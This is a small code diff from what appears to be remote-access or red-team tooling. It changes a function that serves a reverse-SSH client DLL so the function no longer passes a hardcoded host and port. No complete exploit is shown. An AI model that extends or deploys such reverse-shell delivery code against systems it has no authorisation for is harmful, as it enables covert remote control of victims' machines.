@@ -240,11 +240,8 @@ def load_module():
 def deliver_rssh():
     """Deliver client.dll of reverse_ssh"""
 
-    host = '192.168.11.2'
-    port = 2222
-
     try:
-        response = hidden_app.shell_handler.request_client_dll(host, port)
+        response = hidden_app.shell_handler.request_client_dll()
     except Exception:
         response = "error"
         log.error("Failed to get client.dll", exc_info=True)
